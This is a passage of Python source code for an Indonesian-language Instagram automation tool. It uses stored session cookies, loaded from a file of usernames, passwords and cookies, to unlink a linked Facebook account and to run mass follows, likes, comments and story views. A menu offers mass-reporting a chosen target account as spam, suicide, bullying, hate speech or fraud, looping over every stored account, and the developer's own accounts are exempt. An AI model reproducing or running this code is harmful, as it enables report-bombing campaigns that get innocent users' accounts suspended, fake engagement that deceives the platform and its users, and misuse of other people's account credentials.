                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Menghapus Nomor Telpon Mungkin Ini Nomor Telpon Utama!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Tidak Ada Nomor Telpon Yang Terdeteksi Di Akun Insatagram Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Ada Nomor) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Hapus_Akun_Facebook(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-site': 'none',
                'Host': 'accountscenter.instagram.com',
            })
            response = r.get('https://accountscenter.instagram.com/accounts/', cookies = {
                'cookie': cookies
            }).text

            self.x_fb_lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response)).group(1)
            self.x_ig_app_id = re.search('{"X-IG-App-ID":"(\d+)"}', str(response)).group(1)
            self.av = re.search('"actorID":"(\d+)"', str(response)).group(1)
            self.__hs = re.search('"haste_session":"(.*?)"', str(response)).group(1)
            self.__rev = re.search('"__spin_r":(\d+),', str(response)).group(1)
            self.fb_dtsg = re.search('{"token":"(.*?)"}', str(response)).group(1)
            self.__spin_r__spin_b__spin_t = re.findall('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))
            try:
                self.XFBFXFBAccountInfo = re.search('"__typename":"XFBFXFBAccountInfo","id":"(\d+)"', str(response)).group(1)
            except (AttributeError):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Tidak Ada Akun Facebook Yang Terdeteksi Di Akun Insatagram Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Ada Facebook) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            data = {
                'fb_api_req_friendly_name': 'FXUnlinkingFlowQuery',
                'doc_id': '6311373392223471',
                '__ccg': 'GOOD',
                'variables': '{"account_id":"' + str(self.XFBFXFBAccountInfo) + '","account_type":"FACEBOOK","interface":"IG_WEB","platform":"INSTAGRAM","scale":1.5,"username_unlink_entrypoint":"ACCOUNT_UNLINK"}',
                'lsd': self.x_fb_lsd,
                'av': self.av,
                '__spin_r': self.__spin_r__spin_b__spin_t[0][0],
                '__user': '0',
                '__comet_req': '24',
                'server_timestamps': True,
                '__a': '1',
                'fb_dtsg': self.fb_dtsg,
                '__req': 'j',
                '__spin_b': self.__spin_r__spin_b__spin_t[0][1],
                'jazoest': '26200',
                '__hs': self.__hs,
                'dpr': '1.5',
                '__spin_t': self.__spin_r__spin_b__spin_t[0][2],
                '__rev': self.__rev,
                'fb_api_caller_class': 'RelayModern',
            }
            r.headers.update({
                'x-fb-friendly-name': 'FXUnlinkingFlowQuery',
                'referer': 'https://accountscenter.instagram.com/profiles/',
                'sec-fetch-mode': 'cors',
                'origin': 'https://accountscenter.instagram.com',
                'x-fb-lsd': self.x_fb_lsd,
                'sec-fetch-dest': 'empty',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'x-asbd-id': '198387',
                'x-ig-app-id': self.x_ig_app_id,
            })
            response = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            }).text
            data.update({
                'fb_api_req_friendly_name': 'useFXUnlinkMutation',
                'variables': '{"client_mutation_id":"' + str(uuid.uuid1()) + '","account_id":"' + str(self.XFBFXFBAccountInfo) + '","account_type":"FACEBOOK","flow":"IG_WEB_SETTINGS","device_id":"","interface":"IG_WEB","platform":"INSTAGRAM","scale":1.5,"username_unsync_params":null}',
                'doc_id': '6164529603637768',
            })
            response2 = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"is_success":true' in str(response2):
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic green]Sukses Menghapus Akun Facebook Yang Tertaut Di Akun Instagram!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Terjadi Kesalahan Saat Mencoba Untuk Menghapus Akun Facebok!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                exit()

class Submit_Automation:

    def __init__(self) -> None:
        pass

    def Follow_Akun(self, cookies, object_id, username):
        global Sukses, Checkpoint, Looping
        with requests.Session() as r:
            r.headers.update({
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'x-ig-app-id': '936619743392459',
                'referer': 'https://www.instagram.com/',
                'Host': 'www.instagram.com',
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-dest': 'empty',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            })
            data = {
                'container_module': 'single_post',
                'nav_chain': 'PolarisDesktopPostRoot:postPage:1:via_cold_start',
                'user_id': object_id,
            }
            response = r.post('https://www.instagram.com/api/v1/friendships/create/{}/'.format(object_id), data = data, cookies = {
                'cookie': cookies
            }).text
            Looping += 1
            if '"status":"ok"' in str(response):
                try:
                    self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                    self.username = Laporkan().Convert_To_Username(cookies, self.ds_user_id)
                except (Exception):
                    self.username = ('Error')
                Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Status :[italic green] Following you[/]
[bold white]Followers :[bold red] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                Sukses.append(str(response))
                return 0
            else:
                Checkpoint.append(str(response))
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Following @{username} Gagal...", end='\r');time.sleep(1)
                return 1

    def Like_Postingan(self, cookies, media_id):
        global Looping, Checkpoint, Sukses
        with requests.Session() as r:
            r.headers.update({
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'x-ig-app-id': '936619743392459',
                'referer': 'https://www.instagram.com/',
                'Host': 'www.instagram.com',
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-dest': 'empty',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            })
            response = r.post('https://www.instagram.com/api/v1/web/likes/{}/like/'.format(media_id), cookies = {
                'cookie': cookies
            }).text
            if '"status":"ok"' in str(response):
                try:
                    self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                    self.username = Laporkan().Convert_To_Username(cookies, self.ds_user_id)
                except (Exception):
                    self.username = ('Error')
                Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Status :[italic green] Liked your post[/]
[bold white]Likes :[bold red] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                Sukses.append(str(response))
                return 0
            else:
                Checkpoint.append(str(response))
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Likes @{media_id} Gagal...", end='\r');time.sleep(1)
                return 1

    def Komentar_Postingan(self, cookies, media_id, komentar):
        global Looping, Checkpoint, Sukses
        with requests.Session() as r:
            r.headers.update({
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'x-ig-app-id': '936619743392459',
                'referer': 'https://www.instagram.com/',
                'Host': 'www.instagram.com',
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-dest': 'empty',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            })
            self.comment_text = random.choice(komentar.split('+'))
            data = {
                'comment_text': self.comment_text,
            }
            response = r.post('https://www.instagram.com/api/v1/web/comments/{}/add/'.format(media_id), data = data, cookies = {
                'cookie': cookies
            }).text
            if '"status":"ok"' in str(response):
                try:
                    self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                    self.username = Laporkan().Convert_To_Username(cookies, self.ds_user_id)
                except (Exception):
                    self.username = ('Error')
                Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Status :[italic green] Comment on your posts[/]
[bold white]Link :[bold red] https://www.instagram.com/{self.username}
[bold white]Comments :[bold green] {self.comment_text}!""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                Sukses.append(str(response))
                return 0
            else:
                Checkpoint.append(str(response))
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Likes @{media_id} Gagal...", end='\r');time.sleep(1)
                return 1

    def Story_Viewer(self, cookies, stories_url):
        global Looping, Checkpoint, Sukses
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-dest': 'document',
                'Host': 'www.instagram.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-user': '?1',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-site': 'none',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-mode': 'navigate',
            })
            response = r.get(stories_url, cookies = {
                'cookie': cookies
            }).text
            self.media_id = re.search('"initial_media_id":"(\d+)"', str(response)).group(1)
            self.reel_ids = re.search('{"user":{"id":"(\d+)"', str(response)).group(1)
            r.headers.update({
                'sec-fetch-site': 'same-origin',
                'referer': urllib.request.quote(stories_url),
                'accept': '*/*',
                'sec-fetch-mode': 'cors',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'x-asbd-id': '198387',
                'sec-fetch-dest': 'empty',
                'x-ig-app-id': '936619743392459',
            })
            response2 = r.get('https://www.instagram.com/api/v1/feed/reels_media/?media_id={}&reel_ids={}'.format(self.media_id, self.reel_ids), cookies = {
                'cookie': cookies
            })
            self.reelMediaTakenAt = json.loads(response2.text)['reels'][self.reel_ids]['latest_reel_media']
            r.headers.update({
                'origin': 'https://www.instagram.com',
                'content-type': 'application/x-www-form-urlencoded',
            })
            data = {
                'reelMediaTakenAt': self.reelMediaTakenAt,
                'reelMediaId': self.media_id,
                'reelId': self.reel_ids,
                'reelMediaOwnerId': self.reel_ids,
                'viewSeenAt': str(int(time.time())),
            }
            response3 = r.post('https://www.instagram.com/api/v1/stories/reel/seen', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"status":"ok"' in str(response3):
                data = {
                    'media_id': self.media_id,
                }
                response4 = r.post('https://www.instagram.com/api/v1/story_interactions/send_story_like', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"status":"ok"' in str(response4):
                    try:
                        self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                        self.username = Laporkan().Convert_To_Username(cookies, self.ds_user_id)
                    except (Exception):
                        self.username = ('Error')
                    Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Status :[italic green] Liked and viewed your story[/]
[bold white]Link :[bold red] https://www.instagram.com/{self.username}
[bold white]Reaction :[bold green] Love""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                    Sukses.append(str(response4))
                    return 0
                else:
                    Checkpoint.append(str(response4))
                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Views @{self.media_id} Gagal...", end='\r');time.sleep(1)
                    return 1
            else:
                Checkpoint.append(str(response3))
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Views @{self.media_id} Gagal...", end='\r');time.sleep(1)
                return 1

class Tambahan:

    def __init__(self) -> None:
        pass

    def Menu_Lainnya(self, cookies):
        global Looping, Sukses, Checkpoint
        if os.path.exists('Results/Cookies.txt') == False:
            if os.path.exists('Results/Cookie.txt') == False: 
                Login().Laporkan()
        else:
            if os.path.exists('Results/Cookie.txt') == True:
                os.remove('Results/Cookie.txt')
            for z in open('Results/Cookies.txt', 'r').read().splitlines():
                try:
                    self.username, self.password, self.cookies = z.split('|')[0],  z.split('|')[1],  z.split('|')[2]
                    if 'sessionid' in str(self.cookies):
                        with open('Results/Cookie.txt', 'a+') as w:
                            w.write(f'{self.cookies}\n')
                    else:
                        continue
                except (IndexError):
                    continue
            if os.path.exists('Results/Cookie.txt') == False:
                Login().Laporkan()
        self.total_cookies = str(len(open('Results/Cookie.txt', 'r').readlines()))
        Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Laporkan Target Akun Spam       [bold green]07[bold white]. Dapatkan Followers Target
[bold green]02[bold white]. Laporkan Akun Bunuh Diri        [bold green]08[bold white]. Dapatkan Story Views
[bold green]03[bold white]. Laporkan Akun Bullying          [bold green]09[bold white]. Dapatkan Likes Postingan
[bold green]04[bold white]. Laporkan Akun Ujaran            [bold green]10[bold white]. Dapatkan Komentar Postingan
[bold green]05[bold white]. Laporkan Akun Penipuan          [bold green]11[bold white]. Ubah Data Akun Instagram
[bold green]06[bold white]. Laporkan Akun Info Palsu        [bold green]12[bold white]. Kembali ([bold red]Back[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Automation Lainnya) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        query = Console().input("[bold royal_blue1]   ╰─> ")
        if query == '01':
            Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Username[italic white] Target Dan Pastikan Akun Tersebut Benar Benar[italic red] Melanggar[italic white], Misalnya :[italic green] rozhak_official", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Username) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            username = Console().input("[bold royal_blue1]   ╰─> ")
            if 'rozhak_official' in str(username).lower() or 'hannanime12' in str(username).lower() or 'rozhak.sch.id' in str(username).lower():
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Report Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Melaporkan Akun Target, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                self.full_name, self.user_id = Convert().Username(cookies, username, 'Report')
                for z in open('Results/Cookie.txt', 'r').read().splitlines():
                    try:
                        Laporkan().Get_Laporkan(username, self.user_id, z, '1')
                        Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                        time.sleep(0.007)
                    except (RequestException, KeyboardInterrupt):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                        time.sleep(10.5)
                        continue
                    except (Exception) as e:
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                        time.sleep(2.0)
                Console().print("\r                                                                       ", end='\r')
                time.sleep(0.07)
                Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                exit()
        elif query == '02':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Username[italic white] Target Dan Pastikan Akun Tersebut Benar Benar[italic red] Melanggar[italic white], Misalnya :[italic green] rozhak_official", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Username) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                username = Console().input("[bold royal_blue1]   ╰─> ")
                if 'rozhak_official' in str(username).lower() or 'hannanime12' in str(username).lower() or 'rozhak.sch.id' in str(username).lower():
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Report Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Melaporkan Akun Target, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                    self.full_name, self.user_id = Convert().Username(cookies, username, 'Report')
                    for z in open('Results/Cookie.txt', 'r').read().splitlines():
                        try:
                            Laporkan().Get_Laporkan(username, self.user_id, z, '2')
                            Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                            time.sleep(0.007)
                        except (RequestException, KeyboardInterrupt):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                            time.sleep(10.5)
                            continue
                        except (Exception) as e:
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                            time.sleep(2.0)
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                    exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '03':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Username[italic white] Target Dan Pastikan Akun Tersebut Benar Benar[italic red] Melanggar[italic white], Misalnya :[italic green] rozhak_official", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Username) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                username = Console().input("[bold royal_blue1]   ╰─> ")
                if 'rozhak_official' in str(username).lower() or 'hannanime12' in str(username).lower() or 'rozhak.sch.id' in str(username).lower():
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Report Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Melaporkan Akun Target, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                    self.full_name, self.user_id = Convert().Username(cookies, username, 'Report')
                    for z in open('Results/Cookie.txt', 'r').read().splitlines():
                        try:
                            Laporkan().Get_Laporkan(username, self.user_id, z, '3')
                            Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                            time.sleep(0.007)
                        except (RequestException, KeyboardInterrupt):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                            time.sleep(10.5)
                            continue
                        except (Exception) as e:
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                            time.sleep(2.0)
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                    exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '04':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Username[italic white] Target Dan Pastikan Akun Tersebut Benar Benar[italic red] Melanggar[italic white], Misalnya :[italic green] rozhak_official", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Username) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                username = Console().input("[bold royal_blue1]   ╰─> ")
                if 'rozhak_official' in str(username).lower() or 'hannanime12' in str(username).lower() or 'rozhak.sch.id' in str(username).lower():
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Report Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Melaporkan Akun Target, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                    self.full_name, self.user_id = Convert().Username(cookies, username, 'Report')
                    for z in open('Results/Cookie.txt', 'r').read().splitlines():
                        try:
                            Laporkan().Get_Laporkan(username, self.user_id, z, '4')
                            Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                            time.sleep(0.007)
                        except (RequestException, KeyboardInterrupt):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                            time.sleep(10.5)
                            continue
                        except (Exception) as e:
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                            time.sleep(2.0)
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                    exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '05':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Username[italic white] Target Dan Pastikan Akun Tersebut Benar Benar[italic red] Melanggar[italic white], Misalnya :[italic green] rozhak_official", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Username) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                username = Console().input("[bold royal_blue1]   ╰─> ")
                if 'rozhak_official' in str(username).lower() or 'hannanime12' in str(username).lower() or 'rozhak.sch.id' in str(username).lower():
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Report Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Melaporkan Akun Target, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                    self.full_name, self.user_id = Convert().Username(cookies, username, 'Report')
                    for z in open('Results/Cookie.txt', 'r').read().splitlines():
                        try:
                            Laporkan().Get_Laporkan(username, self.user_id, z, '5')
                            Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                            time.sleep(0.007)
                        except (RequestException, KeyboardInterrupt):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                            time.sleep(10.5)
                            continue
                        except (Exception) as e:
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                            time.sleep(2.0)
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                    exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '06':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Username[italic white] Target Dan Pastikan Akun Tersebut Benar Benar[italic red] Melanggar[italic white], Misalnya :[italic green] rozhak_official", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Username) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                username = Console().input("[bold royal_blue1]   ╰─> ")
                if 'rozhak_official' in str(username).lower() or 'hannanime12' in str(username).lower() or 'rozhak.sch.id' in str(username).lower():
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Report Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
